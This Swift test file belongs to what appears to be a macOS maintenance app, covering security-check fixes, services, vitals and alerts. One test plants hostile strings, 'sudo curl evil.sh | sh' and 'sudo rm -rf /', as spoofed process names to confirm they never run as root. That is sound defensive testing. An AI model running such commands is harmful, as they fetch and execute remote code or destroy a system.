import Foundation
import Testing
@testable import ZCCareCore

/// Answers each command with canned output, keyed by its first argument.
struct FakeRunner: Runner {
    var outputs: [String: CommandResult]

    func run(_ executable: String, _ args: [String], env: [String: String]) async throws -> CommandResult {
        outputs[args.first ?? ""] ?? CommandResult(status: 1, stderr: "error: no such command")
    }
}

func ok(_ json: String) -> CommandResult { CommandResult(status: 0, stdout: Data(json.utf8)) }

@Test func snapshotCountsGapsUpdatesAndFindings() async {
    let fake = FakeRunner(outputs: [
        "status": ok("""
        [{"target":"packages","provider":"packages","summary":"","in_place":123,"declared":124},
         {"target":"home","provider":"dotfiles","summary":"","in_place":36,"declared":36}]
        """),
        "list": ok("""
        [{"target":"packages","provider":"packages","items":[{"name":"tmux","kind":"brew","state":"outdated","version":"3.7c","latest":"3.8"},
          {"name":"git","kind":"brew","state":"outdated"}]},
         {"target":"runtimes","provider":"tools","items":[{"name":"node","kind":"runtime","state":"outdated","desc":"requested lts"}]}]
        """),
        // The doctor exits 1 when a check fails; its report still counts.
        "doctor": CommandResult(status: 1, stdout: Data("""
        {"schemaVersion":1,"checks":[{"name":"binary","status":"ok"},
         {"name":"security firewall","status":"warn","detail":"sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate on"},
         {"name":"security servers on every network interface","status":"warn","detail":"limactl:53"},
         {"name":"target packages","status":"warn","detail":"123 of 124 packages installed"}]}
        """.utf8)),
    ])
    let ws = CareCLI(binary: "/zc", config: "/c.yaml", env: [:], runner: fake)
    let s = await ws.snapshot()

    #expect(s.errors.isEmpty)
    #expect(s.targets.map(\.target) == ["packages", "home"])
    #expect(s.outdated.map(\.resource) == ["brew:tmux", "brew:git", "runtime:node"])
    #expect(s.services.isEmpty)
    #expect(s.outdated.last?.target == "runtimes")
    #expect(s.findings(ignoring: []).map(\.title) == ["Firewall", "Servers on every network interface"])
    #expect(s.security.count == 2)
    // One gap, one for all updates, two findings.
    #expect(s.attention(ignoring: []) == 4)
    #expect(s.attention(ignoring: ["security servers on every network interface"]) == 3)
}

@Test func aFailingPartLeavesAnErrorAndTheRest() async {
    let fake = FakeRunner(outputs: ["status": ok(#"[{"target":"home","provider":"dotfiles","summary":"","in_place":1,"declared":1}]"#)])
    let s = await CareCLI(binary: "/zc", config: "/c.yaml", env: [:], runner: fake).snapshot()
    #expect(s.targets.count == 1)
    #expect(s.errors.count == 2)
    #expect(s.errors.allSatisfy { $0.hasSuffix("error: no such command") })
    #expect(s.updatesUnknown)
    #expect(!Snapshot(errors: ["doctor: broken"]).updatesUnknown)
    #expect(!s.targetsUnknown)
}

@Test func anUnreadableTargetIsNotAnEmptyOne() async throws {
    let list = #"[{"target":"home","items":[{"name":"tmux","kind":"brew","state":"outdated"}]},"#
        + #"{"target":"packages","items":null,"error":"read manifest: no such file"}]"#
    let fake = FakeRunner(outputs: ["status": ok("[]"), "doctor": ok(#"{"checks":[]}"#), "list": ok(list)])
    let cli = CareCLI(binary: "/zc", config: "/c.yaml", env: [:], runner: fake)

    let read = try await cli.itemList()
    #expect(read.items.map(\.name) == ["tmux"])
    #expect(read.items.first?.target == "home")
    #expect(read.errors == ["packages: read manifest: no such file"])

    // Homebrew and the app picker decide from this: a formula the unreadable
    // Brewfile declares must not read as undeclared.
    await #expect(throws: CLIError.self) { try await cli.items() }

    let s = await cli.snapshot()
    #expect(s.outdated.map(\.name) == ["tmux"])
    #expect(s.errors == ["list: packages: read manifest: no such file"])
    #expect(s.updatesUnknown)
}

@Test func noTargetsIsUnknownOnlyWhenStatusFailed() {
    #expect(Snapshot(errors: ["status: bad yaml"]).targetsUnknown)
    #expect(Snapshot(errors: ["status: bad yaml"]).statusError == "bad yaml")
    #expect(!Snapshot().targetsUnknown)
    #expect(!Snapshot(errors: ["list: home: slow"]).targetsUnknown)
    let target = TargetStatus(target: "home", provider: "dotfiles", summary: "", inPlace: 0, declared: 1)
    #expect(!Snapshot(targets: [target], errors: ["status: partial"]).targetsUnknown)
}

@Test func planDecodesAndSpotsDeletes() throws {
    let doc = try JSONDecoder().decode(PlanDoc.self, from: Data("""
    {"changes":2,"manual":0,"actions":[{"op":"UPDATE","target":"packages","resource":"brew:tmux","detail":"upgrade","manual":false},
     {"op":"DELETE","target":"notes","resource":"stray.txt","manual":false}]}
    """.utf8))
    #expect(doc.changes == 2)
    #expect(doc.deletes)
}

@Test func fixesFollowTheDoctorsDetail() {
    let sudo = Check(name: "security firewall", status: "warn", detail: "sudo socketfilterfw --setglobalstate on")
    #expect(Fix(for: sudo) == .command("socketfilterfw --setglobalstate on"))

    let lock = Check(name: "security password after sleep or screen saver", status: "warn",
                     detail: "System Settings, Lock Screen: require a password immediately")
    guard case .settings(let url, _) = Fix(for: lock) else { Issue.record("not a settings fix"); return }
    #expect(url.absoluteString.hasSuffix("Lock-Screen-Settings.extension"))
    #expect(Fix.pane(for: "System Settings, General, Sharing: turn Remote Login off").absoluteString.hasSuffix("Sharing-Settings.extension"))
    #expect(Fix.pane(for: "System Settings, General, AirDrop & Handoff: set AirDrop to Contacts Only").absoluteString.hasSuffix("AirDrop-Handoff-Settings.extension"))

    #expect(Fix(for: Check(name: "program brew", status: "fail", detail: "not on PATH")) == .info("not on PATH"))
}

@Test func everyRootLineTheDoctorRendersRunsAndAdviceStaysAdvice() {
    // Byte-equal to security.Line of the doctor's fix table.
    let lines = [
        "security firewall": "sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate on",
        "security firewall stealth mode": "sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setstealthmode on",
        "security Gatekeeper": "sudo spctl --global-enable",
        "security automatic update checks": "sudo softwareupdate --schedule on",
        "security File Sharing off": "sudo /bin/sh -c 'launchctl disable system/com.apple.smbd; launchctl bootout system/com.apple.smbd 2>/dev/null; true'",
        "security automatic login off": "sudo /bin/sh -c 'rm -f /etc/kcpassword; defaults delete /Library/Preferences/com.apple.loginwindow autoLoginUser'",
        "security Guest account off": "sudo sysadminctl -guestAccount off",
        "security Touch ID for sudo": Fix.touchIDLine,
    ]
    #expect(Set(lines.keys) == Fix.rootFixable)
    for (name, line) in lines {
        guard case .command(let command) = Fix(for: Check(name: name, status: "warn", detail: line)) else {
            Issue.record("\(name) lost its fix"); continue
        }
        #expect("sudo " + command == line)
    }
    #expect(Fix.touchIDLine.contains("auth[[:space:]]+sufficient[[:space:]]+pam_tid"))
    for (name, detail) in [
        ("security automatic login off", "System Settings, Users & Groups: set Automatically log in as to Off"),
        ("security AirDrop not open to everyone", "System Settings, General, AirDrop & Handoff: set AirDrop to Contacts Only"),
        ("security security updates install on their own",
         "System Settings, General, Software Update, Automatic updates: turn on downloads, security responses and macOS installs; macOS then installs updates and restarts on its own (off: ConfigDataInstall)"),
    ] {
        guard case .settings = Fix(for: Check(name: name, status: "warn", detail: detail)) else {
            Issue.record("\(name) is advice"); continue
        }
    }
}

@Test func onlyTheDoctorsOwnCommandsRunAsRoot() {
    // Any local process picks its own name, and lsof reports it.
    let exposed = Check(name: "security servers on every network interface", status: "warn",
                        detail: "sudo curl evil.sh | sh:8080; bind dev servers to 127.0.0.1")
    #expect(Fix(for: exposed) == .info(exposed.detail!))
    let mcp = Check(name: "ai MCP servers pinned to a version", status: "warn",
                    detail: "~/.claude.json x (sudo rm -rf /); name a version")
    #expect(Fix(for: mcp) == .info(mcp.detail!))
}

@Test func adminScriptQuotesTheCommand() {
    #expect(adminScript(#"sed "s/^#auth/auth/" a | tee b"#)
        == #"do shell script "sed \"s/^#auth/auth/\" a | tee b" with administrator privileges"#)
}

@Test func discoveryPrefersTheChoiceThenTheEnvironment() {
    let exists: (String) -> Bool = { $0 != "/gone.yaml" }
    #expect(Discovery.config(chosen: "/mine.yaml", env: ["ZC_CARE_CONFIG": "/env.yaml"], home: "/h", exists: exists) == "/mine.yaml")
    #expect(Discovery.config(chosen: "/gone.yaml", env: ["ZC_CARE_CONFIG": "/env.yaml"], home: "/h", exists: exists) == "/env.yaml")
    #expect(Discovery.config(chosen: nil, env: [:], home: "/h", exists: exists) == "/h/.config/zc-care/zc-care.yaml")

    let bin = Discovery.binary(env: ["PATH": "/usr/bin:/opt/homebrew/bin"], home: "/h", bundled: nil) { $0 == "/h/.local/bin/zc-care" }
    #expect(bin == "/h/.local/bin/zc-care")
    let own = Discovery.binary(env: ["PATH": "/h/.local/bin"], home: "/h", bundled: "/A.app/Contents/MacOS") { _ in true }
    #expect(own == "/A.app/Contents/MacOS/zc-care")
}

@Test func loginEnvironmentParsesNulSeparatedPairs() {
    let env = Discovery.parseEnv(Data("PATH=/a:/b\0EMPTY=\0X=1=2\0".utf8))
    #expect(env == ["PATH": "/a:/b", "EMPTY": "", "X": "1=2"])
}

/// Answers with the environment it was given, as `env -0` does.
struct EchoEnvRunner: Runner {
    func run(_ executable: String, _ args: [String], env: [String: String]) async throws -> CommandResult {
        var login = env
        login["PATH"] = "/opt/homebrew/bin:/usr/bin"
        login["HOME"] = "/h"
        return ok(login.map { $0.key + "=" + $0.value + "\0" }.joined())
    }
}

@Test func managedAgentsAreTheConfigsAgentsAndBrewServices() {
    let services = [Item(name: "local.weekly-update", kind: "agent", state: "ok"),
                    Item(name: "postgresql@17", kind: "brew", state: "ok"),
                    Item(name: "sketchybar", kind: "brew", state: "ok")]
    #expect(Launchd.managed("local.weekly-update", services: services))
    #expect(Launchd.managed("homebrew.mxcl.postgresql@17", services: services))
    #expect(Launchd.managed("sh.brew.sketchybar", services: services))
    #expect(!Launchd.managed("com.google.GoogleUpdater.wake", services: services))
    #expect(!Launchd.managed("postgresql@17", services: services))
}

@Test func loginEnvironmentDropsTheTerminalsMiseState() async {
    let env = await Discovery.loginEnvironment(runner: EchoEnvRunner(), base: [
        "PATH": "/mise/java/bin:/usr/bin", "MISE_SHELL": "zsh", "__MISE_DIFF": "x", "LANG": "en_US.UTF-8",
    ])
    #expect(env == ["PATH": "/opt/homebrew/bin:/usr/bin", "HOME": "/h", "LANG": "en_US.UTF-8"])
}

@Test func planNamesCoverEachProvidersResource() {
    var node = Item(name: "node", kind: "runtime", state: "outdated")
    node.desc = "requested lts"
    #expect(node.planNames == ["runtime:node", "node", "node@lts"])
    #expect(Item(name: ".zshrc", kind: "dotfile", state: "differs").planNames.contains(".zshrc"))
}

@Test func alertsNameWhatIsNewOnly() {
    let firewall = Check(name: "security firewall", status: "warn")
    let old = Snapshot(targets: [TargetStatus(target: "home", inPlace: 36, declared: 36)],
                       outdated: [Item(name: "tmux", kind: "brew", state: "outdated")], findings: [firewall])
    var now = old
    #expect(now.alerts(since: old, ignoring: []).isEmpty)

    now.targets = [TargetStatus(target: "home", inPlace: 34, declared: 36)]
    now.outdated.append(Item(name: "git", kind: "brew", state: "outdated"))
    now.findings.append(Check(name: "security Touch ID for sudo", status: "warn"))
    #expect(now.alerts(since: old, ignoring: []).map(\.title) == ["Touch ID for sudo", "home drifted", "1 update available"])
    #expect(now.alerts(since: old, ignoring: ["security Touch ID for sudo"]).count == 2)
}

@Test func alertsSkipPartialSnapshots() {
    let firewall = Check(name: "security firewall", status: "warn")
    let good = Snapshot(targets: [TargetStatus(target: "home", inPlace: 36, declared: 36)], findings: [firewall])
    let partial = Snapshot(errors: ["doctor: failed"])
    #expect(partial.alerts(since: good, ignoring: []).isEmpty)
    // The read after a partial one would see everything as new.
    #expect(good.alerts(since: partial, ignoring: []).isEmpty)
    #expect(good.alerts(since: Snapshot(), ignoring: []).count == 1)
}

@Test func oneUnreadableTargetLeavesTheOtherAlertsOn() {
    let packages = TargetStatus(target: "packages", provider: "packages", inPlace: 0, declared: 0, error: "mas timed out")
    let stuck = Snapshot(targets: [packages], errors: ["list: packages: mas timed out"])
    var now = stuck
    now.findings = [Check(name: "security firewall", status: "warn")]
    now.outdated = [Item(name: "tmux", kind: "brew", state: "outdated")]

    // The finding is new. The update may only be the target coming back.
    #expect(now.alerts(since: stuck, ignoring: []).map(\.title) == ["Firewall"])
}

@Test func anUnreadRowIsNotDrift() {
    func packages(_ inPlace: Int, error: String? = nil) -> Snapshot {
        Snapshot(targets: [TargetStatus(target: "packages", provider: "packages", inPlace: inPlace,
                                        declared: error == nil ? 10 : 0, error: error)])
    }
    let stuck = packages(0, error: "mas timed out")
    #expect(stuck.targets[0].gaps == 1)
    // Going unreadable, and coming back at the five it was missing all along.
    #expect(stuck.alerts(since: packages(10), ignoring: []).isEmpty)
    #expect(packages(5).alerts(since: stuck, ignoring: []).isEmpty)
    // Real drift between two good reads still speaks.
    #expect(packages(4).alerts(since: packages(5), ignoring: []).map(\.title) == ["packages drifted"])
}

@Test func oneFailureCountsOnce() {
    let row = TargetStatus(target: "packages", provider: "packages", inPlace: 0, declared: 0, error: "mas timed out")
    #expect(Snapshot(targets: [row], errors: ["list: packages: mas timed out"]).attention(ignoring: []) == 1)

    // A services target whose status row reads fine still fails every list.
    let services = TargetStatus(target: "svc", provider: "services", inPlace: 1, declared: 1)
    let lines = ["list: svc: launchctl failed", "services: svc: launchctl failed"]
    #expect(Snapshot(targets: [services], errors: lines).attention(ignoring: []) == 1)

    #expect(Snapshot(errors: ["status: bad", "list: bad", "doctor: bad"]).attention(ignoring: []) == 3)

    // A target may be called doctor; the doctor's own failure still counts.
    let named = TargetStatus(target: "doctor", provider: "packages", inPlace: 0, declared: 0, error: "bad")
    #expect(Snapshot(targets: [named], errors: ["doctor: exited 2"]).attention(ignoring: []) == 2)
}

@Test func onlyATargetWithUpdatesLeavesThemUnknown() {
    let dots = TargetStatus(target: "home", provider: "dotfiles", inPlace: 1, declared: 1)
    let brew = TargetStatus(target: "packages", provider: "packages", inPlace: 1, declared: 1)
    #expect(!Snapshot(targets: [dots, brew], errors: ["list: home: bad"]).updatesUnknown)
    #expect(Snapshot(targets: [dots, brew], errors: ["list: packages: bad"]).updatesUnknown)
    #expect(Snapshot(targets: [dots], errors: ["list: config unreadable"]).updatesUnknown)
}

@Test func oneUnreadableServicesTargetKeepsTheOther() async throws {
    let status = #"[{"target":"svc","provider":"services","summary":"","in_place":1,"declared":1},"#
        + #"{"target":"agents","provider":"services","summary":"","in_place":1,"declared":1}]"#
    let list = #"[{"target":"svc","items":[{"name":"redis","kind":"service","state":"running"}]},"#
        + #"{"target":"agents","items":null,"error":"launchctl failed"}]"#
    let fake = FakeRunner(outputs: ["status": ok(status), "doctor": ok(#"{"checks":[]}"#), "list": ok(list)])
    let s = await CareCLI(binary: "/zc", config: "/c.yaml", env: [:], runner: fake).snapshot()
    #expect(s.statusError == nil)
    #expect(s.services.map(\.name) == ["redis"])
    #expect(s.servicesUnknown)
    #expect(!Snapshot().servicesUnknown)
}

@Test func launchdScheduleAndState() throws {
    let schedule = Launchd.schedule(plist: ["StartCalendarInterval": ["Weekday": 1, "Hour": 10, "Minute": 0]])
    #expect(schedule.first?.weekday == 2)
    var cal = Calendar(identifier: .gregorian)
    cal.timeZone = TimeZone(identifier: "UTC")!
    let thursday = try #require(cal.date(from: DateComponents(year: 2026, month: 10, day: 15, hour: 12)))
    let job = Job(label: "local.weekly-update", schedule: schedule)
    #expect(job.next(after: thursday, calendar: cal) == cal.date(from: DateComponents(year: 2026, month: 10, day: 19, hour: 10)))

    let state = Launchd.parsePrint("\tstate = not running\n\truns = 3\n\tlast exit code = 1: Operation not permitted\n")
    #expect(state.running == false && state.lastExit == 1)
    #expect(Launchd.parsePrint("\tlast exit code = (never exited)\n").lastExit == nil)
}

@Test func serviceCommandsPickBrewOrLaunchctl() {
    let brew = Item(name: "colima", kind: "brew", state: "in place")
    #expect(Launchd.command(.restart, for: brew, uid: 501, home: "/h", brew: "/b/brew")?.1 == ["services", "restart", "colima"])
    #expect(Launchd.command(.run, for: brew, uid: 501, home: "/h", brew: "/b/brew") == nil)
    let agent = Item(name: "local.weekly-update", kind: "agent", state: "in place")
    #expect(Launchd.command(.run, for: agent, uid: 501, home: "/h", brew: "/b/brew")?.1 == ["kickstart", "gui/501/local.weekly-update"])
    #expect(Launchd.command(.stop, for: agent, uid: 501, home: "/h", brew: "/b/brew")?.1
        == ["bootout", "gui/501", "/h/Library/LaunchAgents/local.weekly-update.plist"])
    #expect(Launchd.command(.restart, for: agent, uid: 501, home: "/h", brew: "/b/brew")?.1.last
        == "/h/Library/LaunchAgents/local.weekly-update.plist")
}

@Test func vitalsParseWhatTheToolsPrint() {
    let sensors = Sensors.parse(macmon: Data(#"{"temp":{"cpu_temp_avg":60.5},"fans":[{"rpm":2325},{"rpm":2505}]}\#n"#.utf8))
    #expect(sensors == Sensors(cpuTemp: 60.5, fans: [2325, 2505]))
    let full = Sensors.parse(macmon: Data(#"{"temp":{"cpu_temp_avg":73.1,"gpu_temp_avg":0},"fans":[{"rpm":3865,"max_rpm":5779},{"rpm":4145}],"gpu_usage":[388,0.21],"cpu_power":9.1,"gpu_power":0.55,"sys_power":26.1}"#.utf8))
    #expect(full?.fans == [3865, 4145] && full?.fanLimits == [])
    #expect(full?.gpuTemp == nil && full?.gpuLoad == 0.21)
    #expect(full?.cpuPower == 9.1 && full?.gpuPower == 0.55 && full?.systemPower == 26.1)
    let rated = Sensors.parse(macmon: Data(#"{"temp":{"cpu_temp_avg":70,"gpu_temp_avg":45},"fans":[{"rpm":3800,"max_rpm":5779},{"rpm":4100,"max_rpm":6241}]}"#.utf8))
    #expect(rated?.fanLimits == [5779, 6241] && rated?.gpuTemp == 45)

    var battery = Battery(percent: 100, onAC: true)
    battery.read(systemProfiler: Data(#"{"SPPowerDataType":[{"sppower_battery_health_info":{"sppower_battery_cycle_count":311,"sppower_battery_health":"Good","sppower_battery_health_maximum_capacity":"84 %"}}]}"#.utf8))
    #expect(battery.health == "Good" && battery.capacity == 84 && battery.cycles == 311)
    #expect(battery.state == "Fully charged" && !battery.needsService)

    let devices = Device.parse(systemProfiler: Data(#"{"SPBluetoothDataType":[{"device_connected":[{"soundcore Q20i":{"device_minorType":"Headset"}},{"AirPods":{"device_minorType":"Headphones","device_batteryLevelLeft":"80%","device_batteryLevelRight":"70%"}}]}]}"#.utf8))
    #expect(devices == [Device(name: "AirPods", kind: "Headphones", battery: 70), Device(name: "soundcore Q20i", kind: "Headset")])

    #expect(SpeedTest.parse(Data(#"{"dl_throughput":695232832,"ul_throughput":53217972,"base_rtt":33.05}"#.utf8))?.down == 695232832)

    let procs = Proc.parse(ps: " 1462  17.0 1517280 com.apple.Virtualization.VirtualMachine\n  40387   4.1 826432 Google Chrome Helper\n")
    #expect(procs.map(\.name) == ["com.apple.Virtualization.VirtualMachine", "Google Chrome Helper"])
    #expect(procs.first?.memory == Int64(1517280 * 1024))
}

@Test func adviceNamesTheWorstFirst() {
    var v = Vitals()
    v.disk = Disk(name: "Macintosh HD", total: 500_000_000_000, available: 97_000_000_000)
    v.memory = Memory(pressure: 15, used: 0, total: 0)
    #expect(v.grade(insecure: 0) == .excellent)
    #expect(v.advice(insecure: 0, updates: 40).action == .updates)
    #expect(v.advice(insecure: 0, updates: 0).action == .none)

    v.disk?.available = 15_000_000_000
    #expect(v.grade(insecure: 5) == .fair)
    #expect(v.advice(insecure: 5, updates: 40).action == .freeUp)
}

@Test func anUnreadCheckIsNeitherAFixNorAPass() {
    let unread = Check(name: "security Remote Login off", status: "unknown", detail: "could not read: timed out")
    let open = Check(name: "security firewall", status: "warn", detail: "turn it on")
    let other = Check(name: "program brew", status: "fail")
    #expect([unread].insecure == nil)
    #expect([unread, open].insecure == 1)
    #expect([other].insecure == 0)
    #expect(([] as [Check]).insecure == 0)
}

@Test func unreadSecurityIsNotAHealthyMac() {
    var v = Vitals()
    v.disk = Disk(name: "Macintosh HD", total: 500_000_000_000, available: 97_000_000_000)
    v.memory = Memory(pressure: 15, used: 0, total: 0)
    #expect(v.grade(insecure: 0) == .excellent)
    #expect(v.grade(insecure: nil) == .good)
    #expect(v.advice(insecure: nil, updates: 0).action == .security)
    #expect(v.advice(insecure: nil, updates: 40).action == .security)

    v.disk?.available = 15_000_000_000
    #expect(v.advice(insecure: nil, updates: 0).action == .freeUp)
}

@Test func uncheckedUpdatesAreNotGreatShape() {
    var v = Vitals()
    v.disk = Disk(name: "Macintosh HD", total: 500_000_000_000, available: 97_000_000_000)
    v.memory = Memory(pressure: 15, used: 0, total: 0)
    #expect(v.advice(insecure: 0, updates: 0).action == .none)
    #expect(v.advice(insecure: 0, updates: 0, updatesUnknown: true).action == .updates)
    #expect(v.advice(insecure: 0, updates: 3, updatesUnknown: true).title == "3 updates available")
}

@Test func onlyADoctorFailureLeavesHealthUnknown() {
    #expect(Snapshot(targets: [], outdated: [], findings: [], errors: ["doctor: failed"]).doctorUnknown)
    #expect(!Snapshot(targets: [], outdated: [], findings: [], errors: ["status: failed"]).doctorUnknown)
    #expect(!Snapshot(targets: [], outdated: [], findings: [], errors: []).doctorUnknown)
}

@Test func junkEmptiesAllButWhatItKeeps() throws {
    let dir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
    try FileManager.default.createDirectory(at: dir.appendingPathComponent("a/b"), withIntermediateDirectories: true)
    try Data(count: 10_000).write(to: dir.appendingPathComponent("a/b/f"))
    try Data(count: 10_000).write(to: dir.appendingPathComponent("Homebrew"))
    defer { try? FileManager.default.removeItem(at: dir) }

    let junk = Junk(id: "t", title: "t", detail: "", path: dir.path, keep: ["homebrew"])
    #expect(junk.size() >= 10_000 && junk.size() < 20_000)
    #expect(junk.empty(permanently: true).stayed == 0)
    #expect(try FileManager.default.contentsOfDirectory(atPath: dir.path) == ["Homebrew"])
    #expect(Junk.spots(home: "/h").allSatisfy { $0.path.hasPrefix("/h/") })
}

@Test func driftAndAIChecksAreRead() async {
    let fake = FakeRunner(outputs: [
        "drift": ok(#"{"at":"2026-10-16T07:00:00.123456Z","changes":3,"manual":0,"targets":{"packages":3}}"#),
        "doctor": ok(#"{"checks":[{"name":"ai MCP servers pinned to a version","status":"warn","detail":"x"}]}"#),
    ])
    let s = await CareCLI(binary: "/zc", config: "/c.yaml", env: [:], runner: fake).snapshot()
    #expect(s.drift?.changes == 3)
    #expect(s.drift?.targets?["packages"] == 3)
    #expect(s.security.map(\.title) == ["AI: MCP servers pinned to a version"])
}

@Test func alertLogPostsEachAlertOnceADay() throws {
    var log = AlertLog()
    let start = Date(timeIntervalSince1970: 1_000_000)
    let a = Alert(id: "finding x", title: "x", body: "")
    let b = Alert(id: "finding y", title: "y", body: "")
    #expect(log.fresh([a], now: start).map(\.id) == ["finding x"])
    #expect(log.fresh([a, b], now: start.addingTimeInterval(3600)).map(\.id) == ["finding y"])
    // Kept across launches as JSON.
    var back = try JSONDecoder().decode(AlertLog.self, from: JSONEncoder().encode(log))
    #expect(back.fresh([a], now: start.addingTimeInterval(86400 - 1)).isEmpty)
    #expect(back.fresh([a], now: start.addingTimeInterval(86400)).map(\.id) == ["finding x"])
    #expect(back.posted.count == 2)
}

@Test func vitalsWatchKeepsStillWithARestoredLog() {
    var watch = VitalsWatch(limits: VitalLimits())
    let now = Date(timeIntervalSince1970: 1_000_000)
    watch.posted = ["disk": now.addingTimeInterval(-60)]
    var v = Vitals()
    v.disk = Disk(name: "Macintosh HD", total: 500_000_000_000, available: 1_000_000_000)
    #expect(watch.alerts(for: v, now: now).isEmpty)
    #expect(watch.alerts(for: v, now: now.addingTimeInterval(6 * 3600)).map(\.id) == ["vitals disk"])
}

@Test func overwritesAndScriptsCountAsDeleting() throws {
    let doc = try JSONDecoder().decode(PlanDoc.self, from: Data("""
    {"changes": 1, "manual": 0, "actions": [
      {"op": "UPDATE", "target": "base", "resource": "dotfile:.zshrc", "destructive": true}
    ]}
    """.utf8))
    #expect(doc.deletes)
    #expect(!PlanDoc(changes: 1, manual: 0, actions: [PlanAction(op: "UPDATE", target: "base", resource: "x")]).deletes)
}

@Test func aFailedPlanThrowsAndLeavesNoFileToApply() async throws {
    let file = FileManager.default.temporaryDirectory.appendingPathComponent("plan-\(UUID().uuidString).json")
    try Data("{}".utf8).write(to: file)
    let fake = FakeRunner(outputs: ["plan": CommandResult(status: 1, stdout: Data(#"{"changes": 0, "manual": 0, "actions": []}"#.utf8),
                                                          stderr: "error: config invalid")])
    let ws = CareCLI(binary: "/zc", config: "/c.yaml", env: [:], runner: fake)
    await #expect(throws: CLIError.self) { try await ws.plan(savingTo: file.path) }
    #expect(!FileManager.default.fileExists(atPath: file.path))
}
